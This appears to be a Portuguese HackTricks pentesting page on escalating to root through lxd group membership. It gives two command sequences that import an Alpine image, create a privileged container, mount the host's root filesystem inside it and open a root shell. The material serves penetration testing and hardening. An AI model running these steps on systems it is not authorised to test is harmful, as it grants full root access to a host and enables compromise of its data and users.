# Grupo lxd/lxc - Escalação de privilégios

{{#include ../../../banners/hacktricks-training.md}}

A associação ao grupo de gerenciamento LXD do host (normalmente _**lxd**_) pode fornecer um caminho para root, permitindo controle total do daemon.<sup>[[1]](#references)</sup>

## Exploração sem internet

### Método 1

Você pode baixar uma imagem Alpine para usar com o LXD de um repositório confiável.
O servidor de imagens LXD da Canonical publica builds diários: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Basta obter **lxd.tar.xz** e **rootfs.squashfs** do build mais recente (o nome do diretório é a data).<sup>[[8]](#references)</sup>

Como alternativa, você pode instalar o distrobuilder em sua máquina seguindo as [instruções do projeto](https://github.com/lxc/distrobuilder).<sup>[[4]](#references)[[5]](#references)[[6]](#references)</sup>
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Faça upload de **incus.tar.xz** (**lxd.tar.xz** se você baixou do servidor de imagens da Canonical) e **rootfs.squashfs**, depois importe a imagem e crie um container.<sup>[[2]](#references)[[3]](#references)[[5]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Se encontrar este erro _**Error: No storage pool found. Please create a new storage pool**_\
> Execute **`lxd init`**, configure um storage pool padrão e, em seguida, **repita o bloco anterior de comandos**.<sup>[[2]](#references)</sup>

Por fim, inicie o container e abra um shell root no sistema de arquivos do host:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

Construa uma imagem Alpine e inicie-a com a flag `security.privileged=true`, que mapeia o root do container para o root do host; montar `/` então expõe o filesystem do host dentro do container.<sup>[[1]](#references)[[7]](#references)[[9]](#references)</sup>
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
## References

- [1] [Como reforçar a segurança do LXD](https://canonical.com/lxd/docs/latest/howto/security_harden/)
- [2] [Contêineres e máquinas virtuais do LXD](https://ubuntu.com/server/docs/how-to/virtualisation/lxd/)
- [3] [Como copiar e importar imagens](https://canonical.com/lxd/docs/latest/howto/images_copy/)
- [4] [distrobuilder](https://github.com/lxc/distrobuilder)
- [5] [Como criar imagens com o distrobuilder](https://github.com/lxc/distrobuilder/blob/main/doc/howto/build.md)
- [6] [Definição de imagem do Alpine](https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml)
- [7] [script de build do lxd-alpine-builder](https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine)
- [8] [Servidor de imagens do LXD](https://images.lxd.canonical.com/)
- [9] [Tipo: disk](https://canonical.com/lxd/docs/latest/reference/devices_disk/)
{{#include ../../../banners/hacktricks-training.md}}
